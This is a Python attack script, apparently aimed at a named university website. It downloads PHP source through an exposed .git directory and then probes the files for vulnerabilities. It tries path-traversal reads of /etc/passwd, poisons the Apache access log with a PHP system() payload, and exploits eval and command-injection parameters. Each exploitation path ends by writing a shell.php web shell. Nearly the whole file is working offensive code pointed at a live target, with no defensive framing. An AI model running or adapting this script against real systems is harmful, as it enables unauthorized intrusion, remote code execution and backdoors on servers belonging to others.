#!/usr/bin/env python3
import requests
import zlib
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"

def download_tree(tree_hash, path=""):
    tree_path = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    resp = requests.get(url + tree_path, verify=False, timeout=10)
    if resp.status_code != 200:
        return []
    try:
        tree_data = zlib.decompress(resp.content)
    except:
        return []
    null1 = tree_data.find(b'\0')
    if null1 == -1:
        return []
    pos = null1 + 1
    files = []
    dirs = []
    while pos < len(tree_data):
        null2 = tree_data.find(b'\0', pos)
        if null2 == -1 or null2 + 21 > len(tree_data):
            break
        mode_name = tree_data[pos:null2]
        parts = mode_name.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            hash_hex = tree_data[null2+1:null2+21].hex()
            full_path = f"{path}/{filename}" if path else filename
            if mode == '40000':
                dirs.append((full_path, hash_hex))
            elif filename.endswith('.php'):
                files.append((full_path, hash_hex))
            pos = null2 + 21
        else:
            break
    # 递归下载目录
    for dir_path, dir_hash in dirs:
        sub_files, sub_dirs = download_tree(dir_hash, dir_path)
        files.extend(sub_files)
        dirs.extend(sub_dirs)
    return files, dirs

def download_file(file_hash):
    blob_path = f"/.git/objects/{file_hash[:2]}/{file_hash[2:]}"
    resp = requests.get(url + blob_path, verify=False, timeout=10)
    if resp.status_code == 200:
        try:
            blob_data = zlib.decompress(resp.content)
            null_blob = blob_data.find(b'\0')
            if null_blob != -1:
                return blob_data[null_blob+1:].decode('utf-8', errors='ignore')
        except:
            pass
    return None

print("[*] 深度下载所有PHP文件...")
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"

php_files, dirs = download_tree(tree_hash)
print(f"[+] 找到 {len(php_files)} 个PHP文件")
print(f"[+] 找到 {len(dirs)} 个目录")

# 显示所有文件
print("\n所有PHP文件:")
for fpath, _ in php_files[:50]:
    print(f"  {fpath}")

# 重点分析可能包含漏洞的文件
print("\n[*] 重点分析文件...")

target_files = [
    'index.php',
    'addmeeting.php',
    'login.php',
    'upload.php',
    'admin.php',
]

for file_path, file_hash in php_files:
    filename = file_path.split('/')[-1]
    if any(target in filename.lower() for target in target_files) or 'index' in filename.lower():
        print(f"\n[*] 详细分析: {file_path}")
        content = download_file(file_hash)
        if content:
            print(f"    文件大小: {len(content)} bytes")
            
            # 检查文件包含
            if 'include' in content or 'require' in content:
                includes = re.findall(r'(include|require)[^;]*\$[^;]*;', content)
                if includes:
                    print(f"    [!] 文件包含: {includes[:3]}")
                    # 查找参数
                    params = re.findall(r'\$_(GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
                    if params:
                        print(f"        参数: {params[:5]}")
                        # 测试文件包含
                        web_path = file_path.lstrip('/')
                        for param_type, param_name in params[:2]:
                            test_url = f"{url}/{web_path}?{param_name}=../../../../etc/passwd"
                            resp = requests.get(test_url, verify=False, timeout=5)
                            if "root:" in resp.text and resp.status_code == 200:
                                print(f"        [+] 文件包含成功: {test_url}")
                                # 尝试日志包含
                                log_payload = "<?php system($_GET['c']); ?>"
                                requests.get(f"{url}/{web_path}?{param_name}={log_payload}", verify=False, timeout=5)
                                log_url = f"{url}/{web_path}?{param_name}=../../../../var/log/apache2/access.log&c=id"
                                shell_resp = requests.get(log_url, verify=False, timeout=5)
                                if "uid=" in shell_resp.text:
                                    print(f"        [+] Shell获取成功: {log_url}")
                                    exit(0)
            
            # 检查eval/system
            if 'eval' in content.lower():
                print(f"    [!] 包含eval函数")
                params = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
                if params:
                    web_path = file_path.lstrip('/')
                    for param_type, param_name in params[:2]:
                        test_url = f"{url}/{web_path}?{param_name}=system('id');"
                        resp = requests.get(test_url, verify=False, timeout=5)
                        if "uid=" in resp.text:
                            print(f"        [+] RCE成功: {test_url}")
                            shell_cmd = f"file_put_contents('shell.php','<?php system($_GET[c]); ?>');"
                            shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                            requests.get(shell_url, verify=False, timeout=5)
                            test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                            if "uid=" in test_shell.text:
                                print(f"        [+] Shell获取成功: {url}/shell.php?c=id")
                                exit(0)
            
            if 'system' in content.lower() and '$_GET' in content:
                print(f"    [!] 包含system函数")
                params = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
                if params:
                    web_path = file_path.lstrip('/')
                    for param_type, param_name in params[:2]:
                        test_url = f"{url}/{web_path}?{param_name}=id"
                        resp = requests.get(test_url, verify=False, timeout=5)
                        if "uid=" in resp.text:
                            print(f"        [+] 命令执行成功: {test_url}")
                            shell_cmd = "echo '<?php system($_GET[c]); ?>' > shell.php"
                            shell_url = f"{url}/{web_path}?{param_name}={shell_cmd}"
                            requests.get(shell_url, verify=False, timeout=5)
                            test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                            if "uid=" in test_shell.text:
                                print(f"        [+] Shell获取成功: {url}/shell.php?c=id")
                                exit(0)

print("\n[-] 深度审计完成")
